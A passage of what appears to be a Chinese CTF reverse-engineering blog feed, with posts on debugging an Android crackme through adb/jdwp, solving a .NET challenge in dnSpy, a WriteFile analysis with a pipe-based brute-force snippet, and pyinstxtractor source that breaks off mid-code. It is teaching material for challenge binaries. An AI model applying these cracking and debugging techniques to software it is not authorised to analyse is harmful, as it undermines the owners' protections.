src="http://inews.gtimg.com/newsapp_ls/0/13316591146/0" alt=""></p><p>我提前将断点下在了主要函数上</p><p>F9运行之后点一下check就可以在关键逻辑下断下来了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591227/0" alt=""></p><h2 id="java层调试"><a href="#java层调试" class="headerlink" title="java层调试"></a>java层调试</h2><p>在确保连接了adb之后</p><p>打开jeb找到关键地方下断点</p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591308/0" style="zoom:80%;" /><p>在上面点击调试器-&gt;开始</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591397/0" alt=""></p><p>附上</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591477/0" alt=""></p><p>点击手机check</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591535/0" alt=""></p><p>断下来了</p><p>但是右边的变量显示的好像是一个地址</p><p>分析汇编应该是一个string对象</p><p>尝试更改显示类型</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13316591607/0" alt=""></p><p>over</p><h2 id="JNI-OnLoad断点"><a href="#JNI-OnLoad断点" class="headerlink" title="JNI_OnLoad断点"></a>JNI_OnLoad断点</h2><p>JNI_OnLoad这个函数是apk在加载的时候就会运行的函数</p><p>如果通过附加是不能在这里断下来的,因为早就执行完了</p><p><s>在看过了网上的师傅们的操作之后,我也学会了一点方法论</s></p><p>jdwp可以用安卓stdio的ddms替代,不过比较麻烦</p><p>由于没有root(?),没复现成,vmos也复现不了 故不分析了</p><blockquote><p>am start -D -n com.ctf.crackme/com.ctf.crackme.MainActivity</p><p>./ida64</p><p>adb jdwp</p><p>adb forward tcp:23946 jdwp:5852</p><p>jdb -connect com.sun.jdi.SocketAttach:port=23946,hostname=localhost</p></blockquote><h2 id="不root调试"><a href="#不root调试" class="headerlink" title="不root调试"></a>不root调试</h2><p>简单来说就是在安卓里使用run-as命令, 以被调试app的权限执行ida的服务</p><p>注意将服务push到data/local/tmp里后,用copy命令复制到执行路径下,改权限后即可以运行</p><p><a href="https://bbs.pediy.com/thread-262524.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-262524.htm</a></p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/03/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>.net逆向神器dnSpy</title>
      <link>https://usher2008.github.io/2021/01/15/net%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8dnSpy/</link>
      <guid>https://usher2008.github.io/2021/01/15/net%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8dnSpy/</guid>
      <pubDate>Fri, 15 Jan 2021 08:40:33 GMT</pubDate>
      <description>
      
        dnSpy:一个VS风格且支持中文的 .net debuger and assembly editor
      
      </description>
      
      
      <content:encoded><![CDATA[dnSpy:一个VS风格且支持中文的 .net debuger and assembly editor<a id="more"></a><p>今天做了一个用动态调试十分简单的题目,不过这个题目是 .net 的,一般软件无法调试</p><p>那么今天简单安利一下 dnSpy 的使用</p><h2 id="dnSpy"><a href="#dnSpy" class="headerlink" title="dnSpy"></a>dnSpy</h2><p><a href="https://github.com/dnSpy/dnSpy" target="_blank" rel="noopener">https://github.com/dnSpy/dnSpy</a></p><p>这个软件是在github上开源的,而且有release版,十分的用户友好</p><p>由于github下载速度实在不行,用<a href="https://greasyfork.org/zh-CN/scripts/412245-github-%E5%A2%9E%E5%BC%BA-%E9%AB%98%E9%80%9F%E4%B8%8B%E8%BD%BD" target="_blank" rel="noopener">这个油猴插件</a>,选择HK线路,会快很多</p><p>因为如果要调试,只能使用对应版本的 dnSpy ,所以建议 win32 和 win64 都下好</p><p>反正也不用安装,解压即可使用</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=1&amp;id=4880&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=1&amp;id=4880&amp;page=1</a></p><p>这题目丢进IDA发现是 .net</p><p>立马<a href="https://github.com/de4dot/de4dot" target="_blank" rel="noopener">de4dot</a>一键去壳去混淆</p><p>把去混淆以后的直接丢进本文介绍的神器dnSpy里</p><p>一顿翻找直接找到了核心代码</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13043411240/0" alt=""></p><p>由分析知,当你的输入和它的一堆代码执行过后的结果(一串字符)相等,就成功</p><p>那么我们直接就在他算出要比较的字符串以后下断点</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13043411356/0" alt="添加断点并调试"></p><p>中间会弹一个旷,点确定就好啦</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13043411408/0" alt="result"></p><p>然后flag就直接出来了,这个软件太强了</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/01/15/net%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8dnSpy/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一题引发的关于WriteFile的思考</title>
      <link>https://usher2008.github.io/2021/01/13/%E4%B8%80%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8EWriteFile%E7%9A%84%E6%80%9D%E8%80%83/</link>
      <guid>https://usher2008.github.io/2021/01/13/%E4%B8%80%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8EWriteFile%E7%9A%84%E6%80%9D%E8%80%83/</guid>
      <pubDate>Wed, 13 Jan 2021 09:00:49 GMT</pubDate>
      <description>
      
        引言:今天在buu上看见了个水题
      
      </description>
      
      
      <content:encoded><![CDATA[引言:今天在buu上看见了个水题<a id="more"></a><p>题目为 [FlareOn3]Challenge1</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p><img src="http://inews.gtimg.com/newsapp_ls/0/13034958181/0" alt=""></p><p>这个main逻辑清晰</p><p>先printf再scanf 然后sub_401260最后strcmp</p><p>这个sub_401260是一个换表base64,主要注意力不是这里所以我就不用它了</p><p>不过他实现printf和scanf的方法我觉得挺有意思</p><p>所以我也打算实现一下</p><h2 id="mymain"><a href="#mymain" class="headerlink" title="mymain"></a>mymain</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;defs.h&gt;//这个文件在ida的plugins里</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">128</span>]; <span class="comment">// [esp+0h] [ebp-94h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> *Str1; <span class="comment">// [esp+80h] [ebp-14h]</span></span><br><span class="line">    <span class="keyword">char</span> *Str2; <span class="comment">// [esp+84h] [ebp-10h]</span></span><br><span class="line">    HANDLE Input;<span class="comment">// [esp+88h] [ebp-Ch]</span></span><br><span class="line">    HANDLE Output;<span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line">    DWORD NumberOfBytesWritten; <span class="comment">// [esp+90h] [ebp-4h] BYREF</span></span><br><span class="line">    </span><br><span class="line">    Output = GetStdHandle(STD_OUTPUT_HANDLE);<span class="comment">//STD_OUTPUT_HANDLE==0xFFFFFFF5</span></span><br><span class="line">    Input  = GetStdHandle(STD_INPUT_HANDLE );<span class="comment">//STD_INPUT_HANDLE ==0xFFFFFFF6</span></span><br><span class="line">    Str2   = (<span class="keyword">char</span>*)<span class="string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span>;</span><br><span class="line">    WriteFile(Output, <span class="string">"Enter password:\r\n"</span>, <span class="number">0x12</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    ReadFile(Input, Buffer, <span class="number">0x80</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=NumberOfBytesWritten<span class="number">-2</span>;i&lt;NumberOfBytesWritten;i++)</span><br><span class="line">        Buffer[i]=<span class="number">0</span>;<span class="comment">//将输入末尾的/r/n清除 </span></span><br><span class="line">    Str1=Buffer;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">        WriteFile(Output, <span class="string">"Correct!\r\n"</span>, <span class="number">0xB</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        WriteFile(Output, <span class="string">"Wrong password\r\n"</span>, <span class="number">0x11</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看WriteFile的声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE       hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID      lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD      lpNumberOfBytesWritten,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>hFile是一个句柄，</p><p>文件或I / O设备的句柄（例如，文件，文件流，物理磁盘，卷，控制台缓冲区，磁带驱动器，套接字，通信资源，邮槽或管道）。</p><p>代码里用的是Output句柄也就是STD_OUTPUT_HANDLE，就是标准输出句柄，是从GetStdHandle里面来的</p><p>GetStdHandle百度百科如下</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13034958240/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WriteFile(Output, <span class="string">"Enter password:\r\n"</span>, <span class="number">0x12</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">ReadFile(Input, Buffer, <span class="number">0x80</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>那么这两句代码就好理解了</p><p>在标准输出句柄写”Enter password:\r\n”，长度18，把写了的长度记录在变量NumberOfBytesWritten里，最后的null暂且不管</p><p>在标准输入句柄读，把读到的0x80个字节写到Buffer里，把写了的长度记录在变量NumberOfBytesWritten里，最后的null暂且不管</p><p>虽然不是很懂为什么用这两个句柄就可以操作控制台输入输出，其中原理应该与printf和scanf有相同之处吧，不过因为没有去读源码，所以还是以后再说吧</p><h2 id="另一个例子"><a href="#另一个例子" class="headerlink" title="另一个例子"></a>另一个例子</h2><p>之前那篇用管道爆破控制台程序里面也用了WriteFile，也一起看看吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CreatePipe(&amp;hReadPipe1, &amp;hWritePipe1, &amp;sa, <span class="number">0</span>);</span><br><span class="line">CreatePipe(&amp;hReadPipe2, &amp;hWritePipe2, &amp;sa, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">si.hStdInput   = hReadPipe2;</span><br><span class="line">si.hStdError   = si.hStdOutput = hWritePipe1;</span><br><span class="line"></span><br><span class="line">CreateProcess(<span class="literal">NULL</span>, pCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">WriteFile(hWritePipe2, flag.c_str(), flag.length() + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line">ReadFile(hReadPipe1, cbBuf, BUFSIZE, &amp;dwRead, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>这里是获取了新开程序的标准输入输出流，再进行指定的输入以及获取输出进行处理分析，分析满足条件则爆破到正确的flag</p><p>有兴趣的小伙伴可以翻翻前面的文章</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/01/13/%E4%B8%80%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8EWriteFile%E7%9A%84%E6%80%9D%E8%80%83/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一题搞定exe-&gt;py及z3的简单使用</title>
      <link>https://usher2008.github.io/2021/01/12/%E4%B8%80%E9%A2%98%E6%90%9E%E5%AE%9Aexe%E5%88%B0py%E5%8F%8Az3%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
      <guid>https://usher2008.github.io/2021/01/12/%E4%B8%80%E9%A2%98%E6%90%9E%E5%AE%9Aexe%E5%88%B0py%E5%8F%8Az3%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
      <pubDate>Tue, 12 Jan 2021 09:49:11 GMT</pubDate>
      <description>
      
        一题搞定pyc打包的exe解包,pyc反编译,及z3的简单使用
      
      </description>
      
      
      <content:encoded><![CDATA[一题搞定pyc打包的exe解包,pyc反编译,及z3的简单使用<a id="more"></a><h1 id="羊城杯login"><a href="#羊城杯login" class="headerlink" title="羊城杯login"></a>羊城杯login</h1><p>在buuctf上面可以下载题目</p><h2 id="解包exe-gt-pyc"><a href="#解包exe-gt-pyc" class="headerlink" title="解包exe-&gt;pyc"></a>解包exe-&gt;pyc</h2><p>这题目拿下来一看就知道是pyc包起来的exe</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030823713/0" alt=""></p><p>然后我们使用百度来的工具pyinstxtractor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">PyInstaller Extractor v1.8 (Supports pyinstaller 3.2, 3.1, 3.0, 2.1, 2.0)</span></span><br><span class="line"><span class="string">Author : Extreme Coders</span></span><br><span class="line"><span class="string">E-mail : extremecoders(at)hotmail(dot)com</span></span><br><span class="line"><span class="string">Web    : https://0xec.blogspot.com</span></span><br><span class="line"><span class="string">Date   : 28-April-2017</span></span><br><span class="line"><span class="string">Url    : https://sourceforge.net/projects/pyinstallerextractor/</span></span><br><span class="line"><span class="string">For any suggestions, leave a comment on</span></span><br><span class="line"><span class="string">https://forum.tuts4you.com/topic/34455-pyinstaller-extractor/</span></span><br><span class="line"><span class="string">This script extracts a pyinstaller generated executable file.</span></span><br><span class="line"><span class="string">Pyinstaller installation is not needed. The script has it all.</span></span><br><span class="line"><span class="string">For best results, it is recommended to run this script in the</span></span><br><span class="line"><span class="string">same version of python as was used to create the executable.</span></span><br><span class="line"><span class="string">This is just to prevent unmarshalling errors(if any) while</span></span><br><span class="line"><span class="string">extracting the PYZ archive.</span></span><br><span class="line"><span class="string">Usage : Just copy this script to the directory where your exe resides</span></span><br><span class="line"><span class="string">        and run the script with the exe file name as a parameter</span></span><br><span class="line"><span class="string">C:\path\to\exe\&gt;python pyinstxtractor.py &lt;filename&gt;</span></span><br><span class="line"><span class="string">$ /path/to/exe/python pyinstxtractor.py &lt;filename&gt;</span></span><br><span class="line"><span class="string">Licensed under GNU General Public License (GPL) v3.</span></span><br><span class="line"><span class="string">You are free to modify this source.</span></span><br><span class="line"><span class="string">CHANGELOG</span></span><br><span class="line"><span class="string">================================================</span></span><br><span class="line"><span class="string">Version 1.1 (Jan 28, 2014)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- First Release</span></span><br><span class="line"><span class="string">- Supports only pyinstaller 2.0</span></span><br><span class="line"><span class="string">Version 1.2 (Sept 12, 2015)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Added support for pyinstaller 2.1 and 3.0 dev</span></span><br><span class="line"><span class="string">- Cleaned up code</span></span><br><span class="line"><span class="string">- Script is now more verbose</span></span><br><span class="line"><span class="string">- Executable extracted within a dedicated sub-directory</span></span><br><span class="line"><span class="string">(Support for pyinstaller 3.0 dev is experimental)</span></span><br><span class="line"><span class="string">Version 1.3 (Dec 12, 2015)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Added support for pyinstaller 3.0 final</span></span><br><span class="line"><span class="string">- Script is compatible with both python 2.x &amp; 3.x (Thanks to Moritz Kroll @ Avira Operations GmbH &amp; Co. KG)</span></span><br><span class="line"><span class="string">Version 1.4 (Jan 19, 2016)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Fixed a bug when writing pyc files &gt;= version 3.3 (Thanks to Daniello Alto: https://github.com/Djamana)</span></span><br><span class="line"><span class="string">Version 1.5 (March 1, 2016)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Added support for pyinstaller 3.1 (Thanks to Berwyn Hoyt for reporting)</span></span><br><span class="line"><span class="string">Version 1.6 (Sept 5, 2016)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Added support for pyinstaller 3.2</span></span><br><span class="line"><span class="string">- Extractor will use a random name while extracting unnamed files.</span></span><br><span class="line"><span class="string">- For encrypted pyz archives it will dump the contents as is. Previously, the tool would fail.</span></span><br><span class="line"><span class="string">Version 1.7 (March 13, 2017)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Made the script compatible with python 2.6 (Thanks to Ross for reporting)</span></span><br><span class="line"><span class="string">Version 1.8 (April 28, 2017)</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">- Support for sub-directories in .pyz files (Thanks to Moritz Kroll @ Avira Operations GmbH &amp; Co. KG)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author: In Ming Loh</span></span><br><span class="line"><span class="string">Email: inming.loh@countercept.com</span></span><br><span class="line"><span class="string">Changes have been made to Version 1.8 (April 28, 2017).</span></span><br><span class="line"><span class="string">CHANGELOG</span></span><br><span class="line"><span class="string">================================================</span></span><br><span class="line"><span class="string">- Function extractFiles(self, custom_dir=None) has been modfied to allow custom output directory.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4 <span class="keyword">as</span> uniquename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTOCEntry</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, position, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name)</span>:</span></span><br><span class="line">        self.position = position</span><br><span class="line">        self.cmprsdDataSize = cmprsdDataSize</span><br><span class="line">        self.uncmprsdDataSize = uncmprsdDataSize</span><br><span class="line">        self.cmprsFlag = cmprsFlag</span><br><span class="line">        self.typeCmprsData = typeCmprsData</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PyInstArchive</span>:</span></span><br><span class="line">    PYINST20_COOKIE_SIZE = <span class="number">24</span>           <span class="comment"># For pyinstaller 2.0</span></span><br><span class="line">    PYINST21_COOKIE_SIZE = <span class="number">24</span> + <span class="number">64</span>      <span class="comment"># For pyinstaller 2.1+</span></span><br><span class="line">    MAGIC = <span class="string">b'MEI\014\013\012\013\016'</span>  <span class="comment"># Magic number which identifies pyinstaller</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        self.filePath = path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.fPtr = open(self.filePath, <span class="string">'rb'</span>)</span><br><span class="line">            self.fileSize = os.stat(self.filePath).st_size</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[*] Error: Could not open &#123;0&#125;'</span>.format(self.filePath))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.fPtr.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span 